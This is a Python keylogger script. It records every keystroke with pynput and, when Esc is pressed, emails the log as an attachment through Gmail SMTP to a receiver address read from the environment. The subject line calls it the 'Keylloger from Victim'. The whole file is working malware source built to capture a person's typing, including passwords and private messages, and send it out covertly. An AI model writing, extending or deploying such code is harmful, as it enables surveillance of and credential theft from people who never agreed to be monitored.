from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from enum import Enum
import os
import logging
from dotenv import load_dotenv
import convertLog 


load_dotenv();
log = "";

class SenderInfo(Enum):
    SENDER_EMAIL = os.getenv("SENDER_EMAIL");
    SENDER_PASSWORD_GENERATED = os.getenv("EMAIL_PASSWORD_GENERATED");
    RECIEVER_EMAIL = os.getenv("RECIEVER_EMAIL");
    MAIL_SERVER = "smtp.gmail.com";
    #mail server
    PORT = 587;

class MailSender:
    #method for sending email
    def __init__(self, log_file_name) -> None:
        self.file = log_file_name;
        #Create log and clear all old log files
        
    def send_mail(self):
        # Create a multipart message
        msg = MIMEMultipart();
        msg['From'] = SenderInfo.SENDER_EMAIL.value
        msg['To'] = SenderInfo.RECIEVER_EMAIL.value
        msg['Subject'] = 'Email with Attachment of Keylloger from Victim'
         # Attach the file to the email
        with open(self.file, 'rb') as file:
            file_mime = MIMEBase('application', 'octet-stream')
            file_mime.set_payload(file.read());
        encoders.encode_base64(file_mime)
        file_mime.add_header('Content-Disposition', 'attachment', filename=self.file)
        msg.attach(file_mime)
        # Create an SMTP session
        session = smtplib.SMTP(SenderInfo.MAIL_SERVER.value, SenderInfo.PORT.value)
        # Start the SMTP session
        session.starttls()
        # Log in to the mail server
        session.login(SenderInfo.SENDER_EMAIL.value, SenderInfo.SENDER_PASSWORD_GENERATED.value)
        # Send the email
        text = msg.as_string()
        session.sendmail(SenderInfo.SENDER_EMAIL.value, SenderInfo.RECIEVER_EMAIL.value, text)
        #message
        print("-> Sending email successfully");
        # Close the SMTP session
        session.quit()
    
class KeyLogger:
    def clear_log(self,log_file_path):
        with open(log_file_path, 'w') as f:
            # Write the log
            pass;
    def __init__(self, log_file_name) -> None:
        base_name = os.path.splitext(log_file_name)[0]
        self.log_file_path = base_name + ".log";
        #create log template
        logging.basicConfig(filename=self.log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s');
        self.clear_log(self.log_file_path)
    
    def on_press(self,key=None):
        global log
        log = f"{key} pressed\n"
        logging.info(f'Key {key} pressed')
        print(log);
        
        with open("keylog.txt", "a") as f:
            # f.write(log)
            pass
    #conncention when log every key
    def on_release(self,key=None):
        global log
        if key == keyboard.Key.esc:
            with open(self.log_file_path,"r") as file:
                result_of_log = file.read();
                print(convertLog.convert_to_readable(result_of_log))
                with open('keylog.txt',"w") as file:
                    file.write("-> Logged statement: \n============================\n" + convertLog.convert_to_readable(result_of_log));
            
            send_e_mail = MailSender('keylog.txt');
            #start sending e-mail
            send_e_mail.send_mail();
            return False
        
    def write_log(self):
        with open("keylog.txt", "w") as f:
            # TODO: Add implementation
            pass;
    def key_capture_and_create_log(self):
        self.write_log(); 
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
    def start_log(self):
        self.key_capture_and_create_log();


class LogKeyAndSendingEmail(KeyLogger):
    def __init__(self,log_file_name):
        super().__init__(log_file_name=log_file_name);
    def start_key_logger(self):
        super().on_press();
        super().on_release();
        super().start_log();
    


logger  = LogKeyAndSendingEmail(log_file_name='key');
logger.start_key_logger();
